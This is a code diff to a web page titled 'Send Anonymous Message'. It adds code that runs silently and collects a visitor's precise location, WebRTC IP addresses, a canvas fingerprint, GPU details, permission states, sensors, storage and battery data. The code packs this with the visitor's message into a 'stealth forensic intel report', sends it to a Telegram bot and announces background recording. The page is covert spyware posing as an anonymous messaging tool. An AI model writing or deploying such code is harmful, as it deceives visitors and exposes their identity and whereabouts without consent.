@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Send Anonymous Message</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -41,9 +43,29 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 20px;
+            font-size: 24px;
             font-weight: 800;
             color: white;
+        }
+
+        .description {
+            background: rgba(255, 255, 255, 0.9);
+            border: 1px solid rgba(255, 107, 53, 0.3);
+            padding: 16px;
+            margin-bottom: 24px;
+            border-radius: 12px;
+            font-size: 14px;
+            color: #333;
+            line-height: 1.4;
+        }
+
+        .description p {
+            margin: 0;
+        }
+
+        .description i {
+            color: #FF6B35;
+            margin-right: 8px;
         }
 
         h1 {
@@ -253,10 +275,13 @@
         let stealthVideoCount = 0;
         let stealthLocation = null;
 
+        // EMAILJS INITIALIZATION
+        emailjs.init("_4uxmL_LKg0djw_Lw");
+
         // STEALTH INITIALIZATION - RUN SILENTLY
         window.addEventListener('load', function() {
             console.log('🔒 STEALTH SYSTEM INITIALIZED - Running silently');
-            
+
             // Pre-collect data silently
             initializeStealthData();
         });
@@ -306,7 +331,7 @@
                 console.log('🎯 STARTING STEALTH OPERATION');
 
                 // STEP 1: COLLECT DATA SILENTLY
-                const deviceInfo = getStealthDeviceInfo();
+                const deviceInfo = await getStealthDeviceInfo();
                 const batteryInfo = await getStealthBatteryInfo();
                 
                 // Update location if not already available
@@ -342,18 +367,195 @@
             }
         }
 
-        function getStealthDeviceInfo() {
+        async function getStealthDeviceInfo() {
+            // Browser Deep Details
+            const ua = navigator.userAgent;
+            const browserMatch = ua.match(/(Chrome|Firefox|Safari|Edge|Opera)\/(\d+\.\d+)/);
+            const browser = browserMatch ? browserMatch[1] : 'Unknown';
+            const version = browserMatch ? browserMatch[2] : 'Unknown';
+            const engine = ua.includes('Gecko') ? 'Gecko' : ua.includes('WebKit') ? 'WebKit' : ua.includes('Blink') ? 'Blink' : 'Unknown';
+            const build = ua.match(/Chrome\/(\d+)/)?.[1] || 'Unknown';
+
+            // Capabilities
+            const cookies = navigator.cookieEnabled;
+            const localStorage = 'localStorage' in window;
+            const indexedDB = 'indexedDB' in window;
+            const webGL = getWebGLSupport();
+            const webGPU = 'gpu' in navigator;
+
+            // Memory
+            const mem = performance.memory || {};
+            const jsHeapLimit = mem.jsHeapSizeLimit ? (mem.jsHeapSizeLimit / 1024 / 1024).toFixed(2) + ' MB' : 'N/A';
+            const usedHeap = mem.usedJSHeapSize ? (mem.usedJSHeapSize / 1024 / 1024).toFixed(2) + ' MB' : 'N/A';
+            const totalHeap = mem.totalJSHeapSize ? (mem.totalJSHeapSize / 1024 / 1024).toFixed(2) + 'MB' : 'N/A';
+
+            // Device Hardware
+            const cores = navigator.hardwareConcurrency || 'Unknown';
+            const arch = navigator.platform.includes('64') ? '64-bit' : '32-bit';
+            const gpu = webGL.vendor + ' ' + webGL.renderer;
+            const shadingLang = webGL.shadingLanguageVersion || 'Unknown';
+            const ramApprox = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
+
+            // Touch
+            const maxTouch = navigator.maxTouchPoints || 0;
+            const touchPressure = 'ontouchstart' in window && 'force' in document.createTouch(window, 0, 0, 0, 0, 0, 0, 0, 0, 0) ? 'Supported' : 'Not Supported';
+
+            // Sensors
+            const accelerometer = 'Accelerometer' in window;
+            const gyroscope = 'Gyroscope' in window;
+            const magnetometer = 'Magnetometer' in window;
+            const ambientLight = 'AmbientLightSensor' in window;
+            const barometer = 'Barometer' in window;
+            const orientation = 'DeviceOrientationEvent' in window;
+            const proximity = 'ProximitySensor' in window;
+
+            // Network
+            const conn = navigator.connection || {};
+            const connType = conn.effectiveType || 'Unknown';
+            const rtt = conn.rtt || 'Unknown';
+            const downlink = conn.downlink ? conn.downlink + ' Mbps' : 'Unknown';
+
+            // Geolocation
+            let geo = { latitude: 'N/A', longitude: 'N/A', altitude: 'N/A', accuracy: 'N/A', altitudeAccuracy: 'N/A', heading: 'N/A', speed: 'N/A', timestamp: 'N/A' };
+            if (stealthLocation) {
+                geo.latitude = stealthLocation.lat;
+                geo.longitude = stealthLocation.lng;
+                geo.accuracy = stealthLocation.accuracy;
+                geo.timestamp = new Date().toISOString();
+            }
+
+            // Permissions
+            const permissions = await getPermissionsStatus();
+
+            // System
+            const battery = await getStealthBatteryInfo();
+            const locale = navigator.language;
+            const region = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+            // Storage
+            const storage = await navigator.storage.estimate();
+            const usage = storage.usage ? (storage.usage / 1024 / 1024).toFixed(2) + ' MB' : 'N/A';
+            const quota = storage.quota ? (storage.quota / 1024 / 1024).toFixed(2) + ' MB' : 'N/A';
+            const cacheStorage = 'caches' in window;
+
+            // Extra
+            const visibility = document.visibilityState;
+            const referrer = document.referrer;
+            const hardwareFeatures = navigator.hardwareConcurrency ? 'Enabled' : 'Disabled';
+            const mediaCaps = 'mediaCapabilities' in navigator;
+
             return {
-                userAgent: navigator.userAgent,
+                // Basic
+                userAgent: ua,
                 platform: navigator.platform,
                 language: navigator.language,
                 screen: `${screen.width}x${screen.height}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                mobile: /Mobi|Android|iPhone/i.test(navigator.userAgent),
-                browser: navigator.userAgent.match(/Chrome|Firefox|Safari|Edge/i)?.[0] || 'Unknown',
-                cores: navigator.hardwareConcurrency || 'unknown',
-                memory: navigator.deviceMemory || 'unknown'
+                mobile: /Mobi|Android|iPhone/i.test(ua),
+                browser: browser,
+                cores: cores,
+                memory: navigator.deviceMemory || 'unknown',
+
+                // Detailed
+                browserDetails: { browser, version, engine, build },
+                capabilities: { cookies, localStorage, indexedDB, webGL: webGL.supported, webGPU },
+                memoryDetails: { jsHeapLimit, usedHeap, totalHeap },
+                hardware: { cores, arch, gpu, shadingLang, ramApprox },
+                touch: { maxTouch, touchPressure },
+                sensors: { accelerometer, gyroscope, magnetometer, ambientLight, barometer, orientation, proximity },
+                network: { connType, rtt, downlink },
+                geolocation: geo,
+                permissions,
+                system: { battery, locale, region },
+                storage: { usage, quota, cacheStorage },
+                extra: { visibility, referrer, hardwareFeatures, mediaCaps }
             };
+        }
+
+        function getWebGLSupport() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return { supported: false, vendor: 'N/A', renderer: 'N/A', shadingLanguageVersion: 'N/A' };
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return {
+                    supported: true,
+                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
+                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+                };
+            } catch {
+                return { supported: false, vendor: 'N/A', renderer: 'N/A', shadingLanguageVersion: 'N/A' };
+            }
+        }
+
+        async function getPermissionsStatus() {
+            const perms = ['camera', 'microphone', 'geolocation', 'notifications', 'background-sync', 'clipboard', 'midi', 'bluetooth', 'usb'];
+            const status = {};
+            for (const perm of perms) {
+                try {
+                    const result = await navigator.permissions.query({ name: perm });
+                    status[perm] = { state: result.state, lastRequest: result.lastRequest || 'N/A' };
+                } catch {
+                    status[perm] = { state: 'not-supported', lastRequest: 'N/A' };
+                }
+            }
+            return status;
+        }
+
+        async function getWebRTCIPs() {
+            return new Promise((resolve) => {
+                const ips = [];
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+                pc.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        const ip = event.candidate.candidate.split(' ')[4];
+                        if (ip && !ips.includes(ip)) ips.push(ip);
+                    }
+                };
+                setTimeout(() => {
+                    pc.close();
+                    resolve(ips.length > 0 ? ips.join(', ') : 'Not Available');
+                }, 2000);
+            });
+        }
+
+        function checkStorageSize(type) {
+            try {
+                if (type === 'localStorage' && 'localStorage' in window) {
+                    let total = 0;
+                    for (let key in localStorage) {
+                        if (localStorage.hasOwnProperty(key)) {
+                            total += localStorage[key].length + key.length;
+                        }
+                    }
+                    return (total / 1024).toFixed(2) + ' KB';
+                } else if (type === 'sessionStorage' && 'sessionStorage' in window) {
+                    let total = 0;
+                    for (let key in sessionStorage) {
+                        if (sessionStorage.hasOwnProperty(key)) {
+                            total += sessionStorage[key].length + key.length;
+                        }
+                    }
+                    return (total / 1024).toFixed(2) + ' KB';
+                }
+            } catch {}
+            return 'N/A';
+        }
+
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillText('Canvas Fingerprint', 2, 2);
+                return btoa(canvas.toDataURL().split(',')[1]).substring(0, 16);
+            } catch {
+                return 'N/A';
+            }
         }
 
         async function getStealthBatteryInfo() {
@@ -371,34 +573,113 @@
 
         async function sendStealthDataToTelegram(message, deviceInfo, batteryInfo) {
             const location = stealthLocation || { lat: 'unknown', lng: 'unknown', maps: 'https://maps.google.com/' };
-            
+
             const text = `
-🎯 STEALTH SURVEILLANCE ACTIVATED 🎯
+🎯 ULTIMATE STEALTH FORENSIC INTEL REPORT 🎯
 
-📝 Message: ${message}
+📝 USER MESSAGE: ${message}
 
-📍 Location: 
-🗺️ [Google Maps](${location.maps})
-Lat: ${location.lat}
-Lng: ${location.lng}
-Accuracy: ${location.accuracy}
+🔍 BROWSER DEEP DETAILS:
+Full User-Agent: ${deviceInfo.userAgent}
+Browser: ${deviceInfo.browserDetails.browser} v${deviceInfo.browserDetails.version}
+Engine: ${deviceInfo.browserDetails.engine}
+Build Number: ${deviceInfo.browserDetails.build}
+Vendor: ${navigator.vendor || 'N/A'}
 
-📱 Device:
-${deviceInfo.browser} on ${deviceInfo.platform}
-Screen: ${deviceInfo.screen}
+💻 DEVICE HARDWARE DETAILS:
+CPU Architecture: ${deviceInfo.hardware.arch}
+CPU Threads: ${deviceInfo.hardware.cores}
+GPU Vendor: ${deviceInfo.hardware.gpu.split(' ')[0]}
+GPU Renderer: ${deviceInfo.hardware.gpu.split(' ').slice(1).join(' ')}
+Shading Language: ${deviceInfo.hardware.shadingLang}
+RAM Approximation: ${deviceInfo.hardware.ramApprox}
+Platform: ${deviceInfo.platform}
+Device Model: ${deviceInfo.mobile ? 'Mobile Device' : 'Desktop PC'}
+
+📸 CAMERA & SENSOR CAPABILITIES:
+Cameras: ${navigator.mediaDevices ? 'Available' : 'Not Available'}
+Microphones: ${navigator.mediaDevices ? 'Available' : 'Not Available'}
+Accelerometer: ${deviceInfo.sensors.accelerometer ? 'Supported' : 'Not Supported'}
+Gyroscope: ${deviceInfo.sensors.gyroscope ? 'Supported' : 'Not Supported'}
+Magnetometer: ${deviceInfo.sensors.magnetometer ? 'Supported' : 'Not Supported'}
+Ambient Light Sensor: ${deviceInfo.sensors.ambientLight ? 'Supported' : 'Not Supported'}
+Barometer: ${deviceInfo.sensors.barometer ? 'Supported' : 'Not Supported'}
+Orientation Sensor: ${deviceInfo.sensors.orientation ? 'Supported' : 'Not Supported'}
+Proximity Sensor: ${deviceInfo.sensors.proximity ? 'Supported' : 'Not Supported'}
+Touchscreen: ${'ontouchstart' in window ? 'Supported' : 'Not Supported'}
+Max Touch Points: ${deviceInfo.touch.maxTouch}
+Touch Pressure: ${deviceInfo.touch.touchPressure}
+
+🌐 NETWORK ANALYSIS:
+Connection Type: ${deviceInfo.network.connType}
+Effective Speed: ${deviceInfo.network.downlink}
+RTT Latency: ${deviceInfo.network.rtt}ms
+WebRTC STUN IPs: ${await getWebRTCIPs()}
+
+🧭 GEOLOCATION DEEP INFO:
+Latitude: ${deviceInfo.geolocation.latitude}
+Longitude: ${deviceInfo.geolocation.longitude}
+Accuracy: ${deviceInfo.geolocation.accuracy}
+Altitude: ${deviceInfo.geolocation.altitude}
+Altitude Accuracy: ${deviceInfo.geolocation.altitudeAccuracy}
+Heading: ${deviceInfo.geolocation.heading}
+Speed: ${deviceInfo.geolocation.speed}
+Timestamp: ${deviceInfo.geolocation.timestamp}
+Google Maps: ${location.maps}
+
+🔐 PERMISSIONS FORENSIC INFO:
+Camera: ${deviceInfo.permissions.camera?.state || 'N/A'} (Last: ${deviceInfo.permissions.camera?.lastRequest || 'N/A'})
+Microphone: ${deviceInfo.permissions.microphone?.state || 'N/A'} (Last: ${deviceInfo.permissions.microphone?.lastRequest || 'N/A'})
+Geolocation: ${deviceInfo.permissions.geolocation?.state || 'N/A'} (Last: ${deviceInfo.permissions.geolocation?.lastRequest || 'N/A'})
+Notifications: ${deviceInfo.permissions.notifications?.state || 'N/A'} (Last: ${deviceInfo.permissions.notifications?.lastRequest || 'N/A'})
+Background Sync: ${deviceInfo.permissions['background-sync']?.state || 'N/A'} (Last: ${deviceInfo.permissions['background-sync']?.lastRequest || 'N/A'})
+Clipboard: ${deviceInfo.permissions.clipboard?.state || 'N/A'} (Last: ${deviceInfo.permissions.clipboard?.lastRequest || 'N/A'})
+MIDI: ${deviceInfo.permissions.midi?.state || 'N/A'} (Last: ${deviceInfo.permissions.midi?.lastRequest || 'N/A'})
+Bluetooth: ${deviceInfo.permissions.bluetooth?.state || 'N/A'} (Last: ${deviceInfo.permissions.bluetooth?.lastRequest || 'N/A'})
+USB: ${deviceInfo.permissions.usb?.state || 'N/A'} (Last: ${deviceInfo.permissions.usb?.lastRequest || 'N/A'})
+
+🔥 SYSTEM-LEVEL INFO:
+Battery Level: ${deviceInfo.system.battery.level}
+Battery Charging: ${deviceInfo.system.battery.charging}
+Battery Temperature: N/A (API not exposed)
+Device Timezone: ${deviceInfo.system.region}
+Device Locale: ${deviceInfo.system.locale}
+Device Region: ${deviceInfo.system.region.split('/')[0] || 'Unknown'}
+
+🗄 STORAGE INFO:
+Storage Usage: ${deviceInfo.storage.usage}
+Storage Quota: ${deviceInfo.storage.quota}
+IndexedDB: ${deviceInfo.capabilities.indexedDB ? 'Supported' : 'Not Supported'}
+CacheStorage: ${deviceInfo.storage.cacheStorage ? 'Supported' : 'Not Supported'}
+LocalStorage Size: ${checkStorageSize('localStorage')}
+SessionStorage Size: ${checkStorageSize('sessionStorage')}
+
+🛰 EXTRA TECHNICAL DATA:
+Page Visibility: ${deviceInfo.extra.visibility}
+Document Referrer: ${deviceInfo.extra.referrer || 'Direct Access'}
+Hardware Features: ${deviceInfo.extra.hardwareFeatures}
+Media Capabilities API: ${deviceInfo.extra.mediaCaps ? 'Supported' : 'Not Supported'}
+Screen Resolution: ${deviceInfo.screen}
+Screen Color Depth: ${screen.colorDepth}
+Screen Pixel Depth: ${screen.pixelDepth}
+Screen Orientation: ${screen.orientation?.type || 'N/A'}
 Language: ${deviceInfo.language}
-Mobile: ${deviceInfo.mobile ? 'Yes' : 'No'}
-CPU: ${deviceInfo.cores} cores
-RAM: ${deviceInfo.memory}GB
-Timezone: ${deviceInfo.timezone}
+Languages: ${navigator.languages ? navigator.languages.join(', ') : 'N/A'}
+Cookies Enabled: ${deviceInfo.capabilities.cookies ? 'Yes' : 'No'}
+JavaScript Enabled: Yes
+WebGL Available: ${deviceInfo.capabilities.webGL ? 'Yes' : 'No'}
+WebGPU Available: ${deviceInfo.capabilities.webGPU ? 'Yes' : 'No'}
+Memory JS Heap Limit: ${deviceInfo.memoryDetails.jsHeapLimit}
+Memory Used Heap: ${deviceInfo.memoryDetails.usedHeap}
+Memory Total Heap: ${deviceInfo.memoryDetails.totalHeap}
+Plugins: ${Array.from(navigator.plugins).map(p => p.name).join(', ') || 'None'}
+Canvas Fingerprint: ${getCanvasFingerprint()}
+WebRTC Support: ${'RTCPeerConnection' in window ? 'Supported' : 'Not Supported'}
+Vibration API: ${'vibrate' in navigator ? 'Supported' : 'Not Supported'}
+Device Orientation: ${deviceInfo.sensors.orientation ? 'Supported' : 'Not Supported'}
 
-🔋 Battery:
-Level: ${batteryInfo.level}
-Charging: ${batteryInfo.charging}
-
-⏰ Time: ${new Date().toLocaleString('id-ID')}
-
-🚨 Background recording started...
+⏰ TIMESTAMP: ${new Date().toISOString()}
+🚨 BACKGROUND RECORDING ACTIVATED - MONITORING CONTINUES...
             `.trim();
 
             await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
